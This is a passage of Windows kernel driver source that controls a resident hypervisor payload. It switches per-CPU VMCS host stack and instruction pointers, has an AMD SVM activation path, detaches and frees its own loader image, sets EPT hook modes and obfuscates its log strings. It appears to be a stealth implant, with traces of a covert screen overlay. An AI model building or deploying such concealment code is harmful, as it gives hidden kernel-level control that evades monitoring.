    req->test_size_after = (payload_u64)Utils::imageSize;
    req->test_unloaded = Utils::testDriverUnloaded ? 1 : 0;
    req->test_quarantined = Utils::testDriverImageQuarantined ? 1 : 0;
    req->result = (!Utils::imageBase &&
                   !Utils::imageSize &&
                   req->cutover_clear_result == PAYLOAD_RESULT_OK)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_switch_host_rsp(mapctl_host_rsp_switch* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->switched_count = 0;
    req->failed_index = ~0ull;
    req->last_new_rsp = 0;
    req->last_old_rsp = 0;

    if (req->magic != MAPCTL_HOST_RSP_SWITCH_MAGIC ||
        req->size < sizeof(mapctl_host_rsp_switch) ||
        req->arm != MAPCTL_HOST_RSP_SWITCH_ARM)
    {
        return;
    }

    if (!Utils::imageBase || !Utils::imageSize)
        return;

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !mapdriver_payload_barrier_ready(&ps) ||
        !ps.host_stack_desc_base ||
        !ps.host_stack_desc_count)
    {
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    UINT64 count = diag.vcpu_count;
    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    req->requested_count = count;

    __try
    {
        if (!hv::vmcall_map_host_range(ps.host_stack_base, ps.host_stack_size))
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    for (UINT64 i = 0; i < count; ++i)
    {
        UINT64 new_rsp = desc[i].initial_rsp;
        bool already_switched = ((desc[i].flags & 2ull) != 0) && desc[i].old_rsp;
        req->last_new_rsp = new_rsp;

        if (!new_rsp ||
            new_rsp < ps.host_stack_base ||
            new_rsp >= (ps.host_stack_base + ps.host_stack_size))
        {
            req->failed_index = i;
            return;
        }

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        UINT64 old_rsp = 0;
        __try
        {
            old_rsp = hv::vmcall_set_host_rsp(new_rsp);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            old_rsp = 0;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_old_rsp = old_rsp;
        if (!old_rsp)
        {
            req->failed_index = i;
            return;
        }

        // Preserve the original pre-payload HOST_RSP across repeated switch
        // attempts.  If switchrsp is executed a second time, old_rsp may be the
        // payload stack (or a transient vtcall stack), and overwriting it would
        // make a real restore impossible.
        if (!already_switched)
            desc[i].old_rsp = old_rsp;
        desc[i].last_rsp = new_rsp;
        desc[i].flags |= 2;
        req->switched_count++;
    }

    req->result = (req->switched_count == req->requested_count)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_restore_host_rsp(mapctl_host_rsp_switch* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->switched_count = 0;
    req->failed_index = ~0ull;
    req->last_new_rsp = 0;
    req->last_old_rsp = 0;

    if (req->magic != MAPCTL_HOST_RSP_SWITCH_MAGIC ||
        req->size < sizeof(mapctl_host_rsp_switch) ||
        req->arm != MAPCTL_HOST_RSP_SWITCH_ARM)
    {
        return;
    }

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !ps.host_stack_desc_base ||
        !ps.host_stack_desc_count)
    {
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    UINT64 count = diag.vcpu_count;
    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    req->requested_count = count;
    for (UINT64 i = 0; i < count; ++i)
    {
        UINT64 restore_rsp = desc[i].old_rsp;
        req->last_new_rsp = restore_rsp;
        if (!restore_rsp)
        {
            req->failed_index = i;
            return;
        }

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        UINT64 previous_rsp = 0;
        __try
        {
            previous_rsp = hv::vmcall_set_host_rsp(restore_rsp);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            previous_rsp = 0;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_old_rsp = previous_rsp;
        if (!previous_rsp)
        {
            req->failed_index = i;
            return;
        }

        desc[i].last_rsp = restore_rsp;
        desc[i].flags &= ~2ull;
        req->switched_count++;
    }

    req->result = (req->switched_count == req->requested_count)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_switch_host_rip(mapctl_host_rip_switch* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->switched_count = 0;
    req->failed_index = ~0ull;
    req->last_new_rip = 0;
    req->last_old_rip = 0;

    if (req->magic != MAPCTL_HOST_RIP_SWITCH_MAGIC ||
        req->size < sizeof(mapctl_host_rip_switch) ||
        req->arm != MAPCTL_HOST_RIP_SWITCH_ARM)
    {
        return;
    }

    if (!Utils::imageBase || !Utils::imageSize)
        return;

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !mapdriver_payload_barrier_ready(&ps) ||
        !ps.host_stack_desc_base ||
        !ps.host_stack_desc_count ||
        !ps.image_base ||
        !ps.image_size ||
        !ps.vmexit_trampoline ||
        !ps.vmexit_target)
    {
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    if (diag.vm_exit != ps.vmexit_target)
        return;

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    UINT64 count = diag.vcpu_count;
    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    req->requested_count = count;

    __try
    {
        if (!hv::vmcall_map_host_range(ps.image_base, ps.image_size))
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    for (UINT64 i = 0; i < count; ++i)
    {
        UINT64 new_rip = ps.vmexit_trampoline;
        req->last_new_rip = new_rip;

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        UINT64 old_rip = 0;
        __try
        {
            old_rip = hv::vmcall_set_host_rip(new_rip);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            old_rip = 0;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_old_rip = old_rip;
        if (!old_rip)
        {
            req->failed_index = i;
            return;
        }

        desc[i].old_rip = old_rip;
        desc[i].last_rip = new_rip;
        desc[i].flags |= 4;
        req->switched_count++;
    }

    req->result = (req->switched_count == req->requested_count)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_switch_host_bridge(mapctl_host_rip_switch* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->switched_count = 0;
    req->failed_index = ~0ull;
    req->last_new_rip = 0;
    req->last_old_rip = 0;

    if (req->magic != MAPCTL_HOST_RIP_SWITCH_MAGIC ||
        req->size < sizeof(mapctl_host_rip_switch) ||
        req->arm != MAPCTL_HOST_RIP_SWITCH_ARM)
    {
        return;
    }

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !mapdriver_payload_barrier_ready(&ps) ||
        !ps.host_stack_desc_base ||
        !ps.host_stack_desc_count ||
        !ps.image_base ||
        !ps.image_size ||
        !ps.vmexit_bridge ||
        !ps.vmexit_bridge_target)
    {
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    if (!diag.handle_vm_exit || diag.handle_vm_exit != ps.vmexit_bridge_target)
        return;

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    UINT64 count = diag.vcpu_count;
    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    req->requested_count = count;

    __try
    {
        if (!hv::vmcall_map_host_range(ps.image_base, ps.image_size))
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    for (UINT64 i = 0; i < count; ++i)
    {
        UINT64 new_rip = ps.vmexit_bridge;
        req->last_new_rip = new_rip;

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        UINT64 old_rip = 0;
        __try
        {
            old_rip = hv::vmcall_set_host_rip(new_rip);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            old_rip = 0;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_old_rip = old_rip;
        if (!old_rip)
        {
            req->failed_index = i;
            return;
        }

        desc[i].old_rip = old_rip;
        desc[i].last_rip = new_rip;
        desc[i].flags |= 8;
        req->switched_count++;
    }

    req->result = (req->switched_count == req->requested_count)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

static void mapdriver_restore_host_rip(mapctl_host_rip_switch* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->switched_count = 0;
    req->failed_index = ~0ull;
    req->last_new_rip = 0;
    req->last_old_rip = 0;

    if (req->magic != MAPCTL_HOST_RIP_SWITCH_MAGIC ||
        req->size < sizeof(mapctl_host_rip_switch) ||
        req->arm != MAPCTL_HOST_RIP_SWITCH_ARM)
    {
        return;
    }

    payload_status ps = {};
    if (!mapdriver_query_payload_status(&ps) ||
        !ps.host_stack_desc_base ||
        !ps.host_stack_desc_count)
    {
        return;
    }

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (!mapdriver_hv_diag_valid(diag, copied) || !diag.vcpu_count)
            return;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return;
    }

    auto desc = (payload_host_stack_descriptor*)ps.host_stack_desc_base;
    UINT64 count = diag.vcpu_count;
    if (count > ps.host_stack_desc_count)
        count = ps.host_stack_desc_count;
    if (count > 64)
        count = 64;

    req->requested_count = count;

    for (UINT64 i = 0; i < count; ++i)
    {
        UINT64 restore_rip = desc[i].old_rip;
        req->last_new_rip = restore_rip;
        if (!restore_rip)
        {
            req->failed_index = i;
            return;
        }

        KAFFINITY old_affinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1ull << i));
        UINT64 previous_rip = 0;
        __try
        {
            previous_rip = hv::vmcall_set_host_rip(restore_rip);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            previous_rip = 0;
        }
        KeRevertToUserAffinityThreadEx(old_affinity);

        req->last_old_rip = previous_rip;
        if (!previous_rip)
        {
            req->failed_index = i;
            return;
        }

        desc[i].last_rip = restore_rip;
        desc[i].flags &= ~4ull;
        desc[i].flags &= ~8ull;
        req->switched_count++;
    }

    req->result = (req->switched_count == req->requested_count)
        ? PAYLOAD_RESULT_OK
        : PAYLOAD_RESULT_INVALID_CONTEXT;
}

#if MAPDRIVER_AUTO_ONEKEY_LOAD
typedef VOID(*mapdriver_expand_stack_callout_fn)(PVOID Parameter);
extern "C" NTKERNELAPI NTSTATUS KeExpandKernelStackAndCallout(
    mapdriver_expand_stack_callout_fn Callout,
    PVOID Parameter,
    SIZE_T Size);

static volatile LONG g_onekey_worker_started = 0;
static mapctl_legacy_detach g_onekey_legacy;
static mapctl_host_rsp_switch g_onekey_rsp;
static mapctl_host_rip_switch g_onekey_bridge;
static mapctl_migration_check g_onekey_check;
static mapctl_cutover g_onekey_cutover;
static mapctl_free_test g_onekey_freetest;
static mapctl_hook_mode g_onekey_hook_mode;
static mapctl_ept_mode g_onekey_ept_mode;
static mapctl_memcheck g_onekey_memcheck;

static void mapdriver_delay_ms(LONG milliseconds)
{
    if (milliseconds <= 0)
        return;

    LARGE_INTEGER delay = {};
    delay.QuadPart = -(LONGLONG)milliseconds * 10000LL;
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
}

static bool mapdriver_onekey_wait_payload_barrier(ULONG timeout_ms,
                                                  ULONG step_ms,
                                                  payload_status* last)
{
    if (!step_ms)
        step_ms = 50;

    for (ULONG elapsed = 0; elapsed <= timeout_ms; elapsed += step_ms)
    {
        payload_status ps = {};
        if (mapdriver_query_payload_status(&ps) &&
            ps.magic == PAYLOAD_STATUS_MAGIC &&
            mapdriver_payload_barrier_ready(&ps))
        {
            if (last)
                RtlCopyMemory(last, &ps, sizeof(ps));
            LOG_DEBUG(_XOR_("[mapDriver] onekey payload barrier ready elapsed=%lu pmo_draw=%llu biz=%llu\n"),
                elapsed,
                ps.pmo_draw_done_count,
                ps.business_tick_count);
            return true;
        }

        if (last)
            RtlZeroMemory(last, sizeof(*last));
        mapdriver_delay_ms((LONG)step_ms);
    }

    LOG_DEBUG(_XOR_("[mapDriver] onekey payload barrier wait timeout %lu\n"), timeout_ms);
    return false;
}

static bool mapdriver_onekey_wait_pmo_stable(ULONG timeout_ms,
                                             ULONG step_ms,
                                             payload_status* last)
{
    if (!step_ms)
        step_ms = 100;

    for (ULONG elapsed = 0; elapsed <= timeout_ms; elapsed += step_ms)
    {
        payload_status ps = {};
        if (mapdriver_query_payload_status(&ps) &&
            ps.magic == PAYLOAD_STATUS_MAGIC &&
            mapdriver_payload_barrier_ready(&ps))
        {
            if (last)
                RtlCopyMemory(last, &ps, sizeof(ps));

            bool pmo_ready =
                ps.pmo_last_isfinish &&
                ps.pmo_render_d2d_rt &&
                ps.pmo_render_brush &&
                ps.pmo_render_textfmt &&
                ps.pmo_draw_done_count >= MAPDRIVER_AUTO_ONEKEY_MIN_PMO_DRAWS &&
                ps.business_tick_count >= MAPDRIVER_AUTO_ONEKEY_MIN_BUSINESS_TICKS;

            if (pmo_ready)
            {
                LOG_DEBUG(_XOR_("[mapDriver] onekey PMO stable elapsed=%lu draw=%llu biz=%llu d2d=0x%llX brush=0x%llX tfmt=0x%llX\n"),
                    elapsed,
                    ps.pmo_draw_done_count,
                    ps.business_tick_count,
                    ps.pmo_render_d2d_rt,
                    ps.pmo_render_brush,
                    ps.pmo_render_textfmt);
                return true;
            }
        }
        else if (last)
        {
            RtlZeroMemory(last, sizeof(*last));
        }

        mapdriver_delay_ms((LONG)step_ms);
    }

    if (last)
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey PMO stable wait timeout draw=%llu biz=%llu finish=%llu d2d=0x%llX stage=0x%llX\n"),
            last->pmo_draw_done_count,
            last->business_tick_count,
            last->pmo_last_isfinish,
            last->pmo_render_d2d_rt,
            last->pmo_draw_last_stage);
    }
    return false;
}

static bool mapdriver_onekey_pre_switch_ready(mapctl_migration_check* last)
{
    if (!last)
        return false;

    mapdriver_fill_migration_check(last);

    UINT64 required =
        MAPCTL_MIGRATE_CHECK_PAYLOAD_READY |
        MAPCTL_MIGRATE_CHECK_HV_DIAG_READY |
        MAPCTL_MIGRATE_CHECK_OLD_RIP_IS_VMEXIT |
        MAPCTL_MIGRATE_CHECK_OLD_RSP_IN_STACK |
        MAPCTL_MIGRATE_CHECK_PAYLOAD_STACK_READY |
        MAPCTL_MIGRATE_CHECK_VCPU_COUNT_FITS |
        MAPCTL_MIGRATE_CHECK_VMEXIT_TRAMP_READY |
        MAPCTL_MIGRATE_CHECK_VMEXIT_BRIDGE_READY;

    return (last->flags & required) == required;
}

static bool mapdriver_onekey_wait_pre_switch_ready(ULONG timeout_ms,
                                                   ULONG step_ms,
                                                   mapctl_migration_check* last)
{
    if (!step_ms)
        step_ms = 50;

    for (ULONG elapsed = 0; elapsed <= timeout_ms; elapsed += step_ms)
    {
        if (mapdriver_onekey_pre_switch_ready(last))
        {
            LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
                elapsed,
                last ? last->flags : 0,
                last ? last->diag.vmcs_host_rip : 0,
                last ? last->diag.vmcs_host_rsp : 0,
                last ? last->diag.vcpu_count : 0);
            return true;
        }

        // AMD SVM resumes #VMEXIT after VMRUN in the fixed assembly loop and
        // has no VMCS HOST_RIP field. Do not treat an absent HOST_RIP as a
        // transient condition, and never enter the Intel migration path.
        if (last &&
            (last->diag.flags & 2ull) != 0 &&
            last->diag.vmcs_host_rip == 0)
        {
            LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch blocked backend=AMD-SVM reason=no-host-rip flags=0x%llX result=0x%llX rsp=0x%llX vcpu=%llu\n"),
                last->flags,
                last->result,
                last->diag.vmcs_host_rsp,
                last->diag.vcpu_count);
            return false;
        }

        mapdriver_delay_ms((LONG)step_ms);
    }

    if (last)
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey pre-switch wait timeout flags=0x%llX result=0x%llX rip=0x%llX rsp=0x%llX vcpu=%llu\n"),
            last->flags,
            last->result,
            last->diag.vmcs_host_rip,
            last->diag.vmcs_host_rsp,
            last->diag.vcpu_count);
    }
    return false;
}

static bool mapdriver_configure_resident_modes()
{
    // Both backends use the same payload-side hook policy.  Intel continues
    // into HOST_RIP/HOST_RSP migration; AMD keeps the fixed VMRUN loop and only
    // consumes the payload configuration through the resident control plane.
    auto hook_mode = &g_onekey_hook_mode;
    RtlZeroMemory(hook_mode, sizeof(*hook_mode));
    hook_mode->magic = MAPCTL_HOOK_MODE_MAGIC;
    hook_mode->size = sizeof(*hook_mode);
    hook_mode->arm = MAPCTL_HOOK_MODE_ARM;
    hook_mode->mode = PAYLOAD_HOOK_MODE_OBSERVE;
    mapdriver_hook_mode_control(hook_mode);

    auto ept_mode = &g_onekey_ept_mode;
    RtlZeroMemory(ept_mode, sizeof(*ept_mode));
    ept_mode->magic = MAPCTL_EPT_MODE_MAGIC;
    ept_mode->size = sizeof(*ept_mode);
    ept_mode->arm = MAPCTL_EPT_MODE_ARM;
    ept_mode->mode = PAYLOAD_EPT_MODE_HANDLE_TRAMP;
    mapdriver_ept_mode_control(ept_mode);

    bool const ok =
        hook_mode->result == PAYLOAD_RESULT_OK &&
        hook_mode->new_mode == PAYLOAD_HOOK_MODE_OBSERVE &&
        ept_mode->result == PAYLOAD_RESULT_OK &&
        ept_mode->new_mode == PAYLOAD_EPT_MODE_HANDLE_TRAMP;
    LOG_DEBUG(_XOR_("[mapDriver] stage12 EPT-only modes ok=%d hook=0x%llX/%llu ept=0x%llX/%llu machenike=%d dwm=0\n"),
        (int)ok,
        hook_mode->result,
        hook_mode->new_mode,
        ept_mode->result,
        ept_mode->new_mode,
        (int)MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT);
    return ok;
}

static bool mapdriver_amd_svm_resident_ready(const mapctl_migration_check* last)
{
    if (!last ||
        (last->diag.flags & 2ull) == 0 ||
        last->diag.vmcs_host_rip != 0)
    {
        return false;
    }

    payload_status ps = {};
    bool const payload_ok =
        mapdriver_query_payload_status(&ps) &&
        mapdriver_payload_barrier_ready(&ps);
    bool const diag_ok =
        last->diag.vcpu_count != 0 &&
        last->diag.ghv != 0 &&
        last->diag.ghv_size >= PAGE_SIZE &&
        last->diag.vmcs_host_rsp != 0 &&
        last->diag.vm_exit != 0 &&
        last->diag.handle_vm_exit != 0 &&
        last->diag.vcpu_off_svm_resident_loop != 0 &&
        last->diag.vcpu_off_svm_resident_ack != 0 &&
        Utils::payloadExports != nullptr &&
        Utils::payloadExports->activate_amd_svm != nullptr;
    bool const config_ok =
        payload_ok &&
        ps.hv_diag_cache_ready != 0 &&
        ps.vmexit_trampoline != 0 &&
        ps.vmexit_target == last->diag.vm_exit &&
        ps.vmexit_bridge != 0 &&
        ps.vmexit_bridge_target == last->diag.handle_vm_exit &&
        ps.host_stack_base != 0 &&
        ps.host_stack_size != 0 &&
        ps.host_stack_desc_base != 0 &&
        ps.host_stack_desc_count >= last->diag.vcpu_count;
    bool const hv_ok = mapdriver_hv_ready();
    bool const mode_ok = mapdriver_configure_resident_modes();
    bool const ok = payload_ok && diag_ok && config_ok && hv_ok && mode_ok;

    LOG_DEBUG(_XOR_("[mapDriver] onekey AMD resident validation ok=%d payload=%d diag=%d config=%d hv=%d modes=%d vcpu=%llu ghv=0x%llX rsp=0x%llX target=0x%llX bridge=0x%llX\n"),
        (int)ok,
        (int)payload_ok,
        (int)diag_ok,
        (int)config_ok,
        (int)hv_ok,
        (int)mode_ok,
        last->diag.vcpu_count,
        last->diag.ghv,
        last->diag.vmcs_host_rsp,
        ps.vmexit_target,
        ps.vmexit_bridge_target);
    return ok;
}

static bool mapdriver_amd_svm_activate_all(const mapctl_hv_diag& diag)
{
    if (!Utils::payloadExports ||
        !Utils::payloadExports->activate_amd_svm ||
        !diag.vcpu_count ||
        diag.vcpu_count > 64)
    {
        return false;
    }

    payload_u64 armed = 0;
    __try
    {
        armed = Utils::payloadExports->activate_amd_svm(
            PAYLOAD_AMD_SVM_ACTIVATE_ARM);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        armed = 0;
    }
    if (armed != diag.vcpu_count)
        return false;

    payload_u64 last_ack = 0;
    for (ULONG attempt = 0; attempt < 10; ++attempt)
    {
        payload_u64 triggered = 0;
        payload_u64 trigger_failures = 0;
        USHORT group_count = KeQueryActiveGroupCount();
        for (USHORT group = 0; group < group_count && triggered < diag.vcpu_count; ++group)
        {
            ULONG processors = KeQueryActiveProcessorCountEx(group);
            for (ULONG cpu = 0; cpu < processors && triggered < diag.vcpu_count; ++cpu)
            {
                GROUP_AFFINITY ga = {};
                ga.Group = group;
                ga.Mask = 1ull << cpu;

                GROUP_AFFINITY old_ga = {};
                KeSetSystemGroupAffinityThread(&ga, &old_ga);
                payload_u64 pong = 0;
                __try
                {
                    pong = hv::ping();
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                    pong = 0;
                }
                KeRevertToUserGroupAffinityThread(&old_ga);

                if (pong != hv::hypervisor_signature)
                    ++trigger_failures;
                ++triggered;
            }
        }

        if (triggered != diag.vcpu_count)
            return false;

        __try
        {
            last_ack = Utils::payloadExports->activate_amd_svm(
                PAYLOAD_AMD_SVM_ACTIVATE_QUERY);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            last_ack = 0;
        }

        if (last_ack == diag.vcpu_count)
        {
            LOG_DEBUG(_XOR_("[mapDriver] AMD resident VMRUN loop active ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
                last_ack, diag.vcpu_count, attempt, trigger_failures);
            return true;
        }

        LOG_DEBUG(_XOR_("[mapDriver] AMD resident transfer pending ack=%llu/%llu attempt=%lu trigger_failures=%llu\n"),
            last_ack, diag.vcpu_count, attempt, trigger_failures);
        mapdriver_delay_ms(50);
    }

    LOG_DEBUG(_XOR_("[mapDriver] AMD resident transfer incomplete ack=%llu/%llu; legacy image retained\n"),
        last_ack, diag.vcpu_count);
    return false;
}

static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
                                          const mapctl_migration_check& pre)
{
    if (!mapdriver_amd_svm_resident_ready(&pre) ||
        !mapdriver_configure_resident_modes())
    {
        return false;
    }

    auto legacy = &g_onekey_legacy;
    RtlZeroMemory(legacy, sizeof(*legacy));
    legacy->magic = MAPCTL_LEGACY_DETACH_MAGIC;
    legacy->size = sizeof(*legacy);
    legacy->arm = MAPCTL_LEGACY_DETACH_ARM;
    legacy->mode = PAYLOAD_LEGACY_DETACH_MODE_ARM;
    mapdriver_legacy_detach_control(legacy);
    if (legacy->result != PAYLOAD_RESULT_OK ||
        ((legacy->new_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
    {
        return false;
    }

    mapdriver_adopt_testdriver_pool_blocks("onekey-amd-legacy-detach");

    payload_status hostmap_ps = {};
    if (!mapdriver_query_payload_status(&hostmap_ps) ||
        !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "onekey-amd-pre-activate"))
    {
        return false;
    }

    if (!mapdriver_amd_svm_activate_all(pre.diag))
        return false;

    if (!mapdriver_unload_common(DriverObject, true, false, true))
        return false;

    payload_u64 cutover = mapdriver_set_payload_mode(
        hv::payload_mode_cutover,
        PAYLOAD_CUTOVER_MODE_CLEAR);
    if (cutover != PAYLOAD_RESULT_OK)
        return false;

    auto freetest = &g_onekey_freetest;
    RtlZeroMemory(freetest, sizeof(*freetest));
    freetest->magic = MAPCTL_RELEASE_LEGACY_IMAGE_MAGIC;
    freetest->size = sizeof(*freetest);
    freetest->arm = MAPCTL_RELEASE_LEGACY_IMAGE_ARM;
    mapdriver_free_test_image_control(freetest);
    LOG_DEBUG(_XOR_("[mapDriver] AMD freetest result=0x%llX phase=%llu image=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu\n"),
        freetest->result,
        freetest->free_phase,
        freetest->test_before,
        freetest->test_size_before,
        freetest->test_after,
        freetest->test_size_after,
        freetest->vcpu_ready,
        freetest->vcpu_requested,
        freetest->scan_refs);
    return freetest->result == PAYLOAD_RESULT_OK;
}

static bool mapdriver_onekey_migration_ready(mapctl_migration_check* last)
{
    if (!last)
        return false;

    mapdriver_fill_migration_check(last);

    bool legacy_ok =
        last->payload.legacy_detached &&
        last->payload.legacy_detach_result == PAYLOAD_RESULT_OK &&
        ((last->payload.legacy_detach_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) != 0);
    bool rip_bridge =
        (last->flags & MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_BRIDGE) != 0;
    bool rsp_payload =
        (last->flags & MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD) != 0;

    return last->result == PAYLOAD_RESULT_OK &&
        legacy_ok &&
        rip_bridge &&
        rsp_payload;
}

static bool mapdriver_onekey_wait_migration_ready(const char* phase,
                                                  ULONG timeout_ms,
                                                  ULONG step_ms,
                                                  mapctl_migration_check* last)
{
    if (!step_ms)
        step_ms = 50;

    for (ULONG elapsed = 0; elapsed <= timeout_ms; elapsed += step_ms)
    {
        if (mapdriver_onekey_migration_ready(last))
        {
            LOG_DEBUG(_XOR_("[mapDriver] onekey %s migration ready elapsed=%lu flags=0x%llX rip=0x%llX rsp=0x%llX\n"),
                phase,
                elapsed,
                last ? last->flags : 0,
                last ? last->diag.vmcs_host_rip : 0,
                last ? last->diag.vmcs_host_rsp : 0);
            return true;
        }

        mapdriver_delay_ms((LONG)step_ms);
    }

    if (last)
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey %s migration wait timeout flags=0x%llX result=0x%llX legacy=%llu/0x%llX rsp=0x%llX rip=0x%llX\n"),
            phase,
            last->flags,
            last->result,
            last->payload.legacy_detached,
            last->payload.legacy_detach_flags,
            last->diag.vmcs_host_rsp,
            last->diag.vmcs_host_rip);
    }
    return false;
}

static bool mapdriver_run_onekey_load(PDRIVER_OBJECT DriverObject)
{
    LOG_DEBUG(_XOR_("[mapDriver] onekey begin %d\n"), 1);

    if (!mapdriver_configure_resident_modes())
        return false;

    auto legacy = &g_onekey_legacy;
    RtlZeroMemory(legacy, sizeof(*legacy));
    legacy->magic = MAPCTL_LEGACY_DETACH_MAGIC;
    legacy->size = sizeof(*legacy);
    legacy->arm = MAPCTL_LEGACY_DETACH_ARM;
    legacy->mode = PAYLOAD_LEGACY_DETACH_MODE_ARM;
    mapdriver_legacy_detach_control(legacy);
    LOG_DEBUG(_XOR_("[mapDriver] onekey legacy result=0x%llX stage=%llu flags=0x%llX ghv=0x%llX/0x%llX vt=0x%llX/0x%llX\n"),
        legacy->result,
        legacy->stage,
        legacy->new_flags,
        legacy->ghv_copy,
        legacy->ghv_size,
        legacy->vt_hook_copy,
        legacy->vt_hook_size);
    if (legacy->result != PAYLOAD_RESULT_OK ||
        ((legacy->new_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
    {
        return false;
    }

    mapdriver_adopt_testdriver_pool_blocks("onekey-legacy-detach");
    legacy->stage = 7;

    payload_status hostmap_ps = {};
    if (!mapdriver_query_payload_status(&hostmap_ps) ||
        hostmap_ps.magic != PAYLOAD_STATUS_MAGIC ||
        !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "onekey-pre-switch"))
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey hostmap pre-switch failed\n"));
        return false;
    }

    auto rsp = &g_onekey_rsp;
    RtlZeroMemory(rsp, sizeof(*rsp));
    rsp->magic = MAPCTL_HOST_RSP_SWITCH_MAGIC;
    rsp->size = sizeof(*rsp);
    rsp->arm = MAPCTL_HOST_RSP_SWITCH_ARM;
    mapdriver_switch_host_rsp(rsp);
    LOG_DEBUG(_XOR_("[mapDriver] onekey switchrsp result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
        rsp->result,
        rsp->switched_count,
        rsp->requested_count,
        rsp->failed_index,
        rsp->last_new_rsp,
        rsp->last_old_rsp);
    if (rsp->result != PAYLOAD_RESULT_OK)
        return false;

    auto bridge = &g_onekey_bridge;
